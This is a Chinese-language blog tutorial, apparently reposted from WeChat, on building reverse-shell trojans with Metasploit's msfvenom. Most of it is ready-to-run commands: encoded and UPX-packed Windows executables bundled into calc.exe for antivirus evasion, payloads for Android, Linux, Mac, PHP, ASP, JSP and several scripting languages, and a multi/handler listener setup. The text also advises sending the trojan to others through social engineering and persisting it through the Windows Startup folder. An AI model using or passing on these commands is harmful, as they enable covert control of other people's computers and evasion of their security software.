> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484177&idx=1&sn=95643b5149cc2858187ee7b08944ed87&chksm=eaad832cddda0a3a1c340971bda73c34a5e808f3bb9d686f5a955f721dd1e3fd746406e57653&scene=21#wechat_redirect)

**目录**

  

Msfvenom

生成 exe 木马

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HzZrTT4UZAcukC3cKqetSHpGJABL8ZCM8yibLyNpvY2Zia3IAY3P6yE9A/640?wx_fmt=gif)

  

  

在前一篇文章中我讲了什么是 Meterpreter，并且讲解了 Meterpreter 的用法。传送门——>Metasploit 之 Meterpreter

今天我要讲的是我们用 Msfvenom 制作一个木马，发送给其他主机，只要其他主机运行了该木马，就会自动连接到我们的主机，并且建立一条 TCP 连接。我们可以通过这条 TCP 连接控制目标主机。

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3omibErD0ylUqAdVrtJNSatMGHTmp1EJfkFZ3oOOtVyayHwic46picqfC9z4AN9xsMosJbw1WFDQIguaA/640?wx_fmt=png)

Msfvenom

**Msfvenom**  

· –p (- -payload-options)：添加载荷 payload。载荷这个东西比较多，这个软件就是根据对应的载荷 payload 生成对应平台下的后门，所以只有选对 payload，再填写正确自己的 IP，PORT，就可以生成对应语言，对应平台的后门了！！！

· –l：查看所有 payload encoder nops。

· –f ：输出文件格式。

· –e：编码免杀。

· –a：选择架构平台  x86 | x64 | x86_64

· –o：文件输出

· –s：生成 payload 的最大长度，就是文件大小。

· –b：避免使用的字符 例如：不使用 ‘\0f’。

· –i：编码次数。

· –c：添加自己的 shellcode

· –x | -k：捆绑

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e4moqygI59agYAD3Btf8jPDic5yc991Wgzsy7R3jEHHXqxZYNmiaGQFicoAt3kpEjeseJ2zic4l1iaG8w/640?wx_fmt=png)

### **生成 exe 木马**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.27 lport=8888 -f exe -o test.exe  #lhost是我们的主机ip，lport是我们主机的用于监听的端口

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.27 lport=8888 -i 3 -e x86/shikata_ga_nai  -f exe -o test.exe  #编码3次
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e4moqygI59agYAD3Btf8jP8oBxenauKpwDZ0L54XXlrMEVBMAmylA2JaRUfBSS9ygCCibmVwmqnrA/640?wx_fmt=png)

然后会在该目录下生成一个 test.exe 的木马。

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 20 lhost=192.168.10.11 lport=8888 -x calc.exe -f exe -o test.exe      #编码20次、捆绑正常的32位calc.exe，生成32位的test.exe文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e4moqygI59agYAD3Btf8jP08m5WPThS0J9iaxswiaQBuQIn2lAG7u2ib6blZbRq9udicqicemf0Ob9iaicw/640?wx_fmt=png)

**利用 upx 加壳**

upx -9 test.exe -k -o test2.exe

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e4moqygI59agYAD3Btf8jPFrIxphcBib6mCvdic5uuglVHWDuI0fcg3StFMHibLsXMGWp36SWUQM4TQ/640?wx_fmt=png)

**下面介绍一些生成其他格式的木马！**

```
安卓app:

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -o ~/Desktop/test2.apk

Linux:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f  elf > shell.elf

Mac:

msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f macho >  shell.macho

PHP：

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.27 LPORT=4444 -f raw -o test.php

ASP:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888  -f asp > shell.asp

ASPX：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888  -f  aspx > shell.aspx

JSP:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f  raw > shell.jsp

Bash：

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.10.27 LPORT=8888 -f   raw > shell.sh

Perl

msfvenom -p cmd/unix/reverse_perl LHOST=192.168.10.27 LPORT=8888 -f raw > shell.pl

Python

msfvenom -p python/meterpreter/reverser_tcp LHOST=192.168.10.27 LPORT=8888 -f   raw > shell.py
```

接下来，我们运行 msfconsole 进入 MSF 控制台，然后输入以下命令

```
msf > use exploit/multi/handler  #使用exploit/multi/handler监听从肉鸡发来的数据

msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  #设置payload，不同的木马设置不同的payload

msf exploit(handler) > set lhost 192.168.10.15  #我们的主机ip

msf exploit(handler) > set lport 8888            #我们的主机端口

msf exploit(handler) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e4moqygI59agYAD3Btf8jPbrmeCtqnuFhUvDbf8426fYxBEZ08jeP1wiajnzTEaV82ERzWdE5CHCA/640?wx_fmt=png)

然后，将木马发送给其他人，无论使用什么手段 (可以使用社会工程学) 让其在其他主机上运行，我们这边就会接收到反弹过来的 session。

因为我们刚刚把进程挂在后台，所以我们输入：**sessions  -l**  可以查看到我们得到的 shell，使用 sessions -i  1 可以进入指定的 shell，我们这里只有一个，所以 id 为 1。如图，我们成功拿到了其他主机的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2e4moqygI59agYAD3Btf8jP2BNKuwBZLibbYdEQ0tUyuiaFG1WicibJxFCEuMaicwrMQzQYX4hQIqZyrEw/640?wx_fmt=png)

对于这个木马，如果我们在获取到某主机的 shell 后，想要在目标主机建立持续性的后门，我们可以将该木马放到目标主机的开机启动项中，那样，只要该主机启动后，我们就可以连接到该主机了。

```
C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

关于 MSF 的详细使用教程，可以参考如下书籍

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2ckkbwTsBvnDJpb89o8WMxvAKOaVnz60hOe7y3wAHiclddyK53lpEKIQlx4DKOq6EojHibVicgibDB2aQ/640)

来源：谢公子的博客

责编：梁粉

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640)

由于文章篇幅较长，请大家耐心。如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640)